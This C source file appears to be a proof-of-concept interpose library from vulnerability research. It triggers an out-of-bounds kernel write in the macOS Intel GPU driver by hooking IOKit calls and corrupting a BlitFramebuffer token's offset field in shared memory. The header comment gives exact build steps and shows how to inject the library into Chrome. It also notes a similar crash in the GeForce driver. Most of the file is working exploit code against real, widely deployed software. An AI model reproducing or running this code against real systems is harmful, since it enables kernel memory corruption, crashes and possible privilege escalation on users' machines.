/*
this is an interpose dylib, compile with: clang -Wall -dynamiclib -o ig_sideband_buffer_oob.dylib ig_sideband_buffer_oob.c -framework IOKit -arch i386 -arch x86_64
and load it like this: $ DYLD_INSERT_LIBRARIES=./ig_sideband_buffer_oob.dylib /Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
navigating chrome to: http://damienmortini.me.uk/house/ triggers the BlitFramebuffer token (probably most webgl pages will do)

BUG:
The Intel GPU driver uses shared memory for drawing commands. The userspace
client of the driver calls IOConnectMapMemory to map a shared page which it will use,
calling selector 2 (submit_data_buffers) to signal to the driver that it should
consume the commands (tokens) written there by the client.

The first 0x10 bytes of the shared memory are some kind of header, the rest is filled with
tokens of the form:

+0x00 2-byte token ID
+0x02 length of token (in 4 byte words, including this header)
+0x04 4 byte output offset??
+0x08 body of token
..

I'm still not completely sure what the 4 byte output offset field is actually for,
but after processing all the tokens the driver calls IGAccelFIFOChannel::submitBuffer,
and writes two words (maybe end of buffer delimiters?) using a value derived from those offset fields
as an index and there's no bounds checking, so by specifying a large output offset for a token
you can get this function to write the two words: 0x05000000 0x00000000 at a controlled offset.

tested on: MacBookAir5,2 w/ 10.9.3/13d64

// it appears to crash the GeForce driver too with what looks at first glance like a similar issue
// I haven't had a chance to look at it yet but running this repro on a MacBookPro10,1 crashes in
// nvFermiGLContext::UpdateDrawableOffsets with an OOB write :-)
*/


#include <inttypes.h>
#include <IOKit/IOKitLib.h>
#include <mach/mach.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>


void* token_buf = 0;

kern_return_t
fake_IOConnectMapMemory(
  io_connect_t connect,
  uint32_t memoryType,
  task_port_t intoTask,
  vm_address_t *atAddress,
  vm_size_t *ofSize,
  IOOptionBits options )
{
  kern_return_t ret = IOConnectMapMemory(connect, memoryType, intoTask, atAddress, ofSize, options);
  
  // is this the mapping for the sideband buffer for the gpu tokens?
  if (memoryType == 0){
    token_buf = *atAddress;
  }
  return ret;
}

kern_return_t
fake_IOConnectCallStructMethod(
        mach_port_t      connection,            // In
        uint32_t         selector,              // In
        const void      *inputStruct,           // In
        size_t           inputStructCnt,        // In
        void            *outputStruct,          // Out
        size_t          *outputStructCnt)       // In/Out
{ 
  if (selector == 2){
    if (token_buf != 0){
      uint16_t needle = 0x8500; // BlitFramebuffer token
      
      uint32_t* at = memmem(token_buf, 0x1000, &needle, 2);
      if (at){
        // overwrite the output offset(??) field with a large value
        // a value a few bytes less than this will be rax at the crash:
        // mov [rcx + 4*rax] = 0x5000000
        at[1] = 0xffff01;
      }
    }
  }

  return IOConnectCallStructMethod(
          connection,            // In
          selector,              // In
          inputStruct,           // In
          inputStructCnt,        // In
          outputStruct,          // Out
          outputStructCnt);      // In/Out

}

typedef struct interposer {
  void* replacement;
  void* original;
} interpose_t;

__attribute__((used)) static const interpose_t interposers[]
  __attribute__((section("__DATA, __interpose"))) =
    { {.replacement = (void*)fake_IOConnectMapMemory, .original = (void*)IOConnectMapMemory},
      {.replacement = (void*)fake_IOConnectCallStructMethod, .original = (void*)IOConnectCallStructMethod},
    };

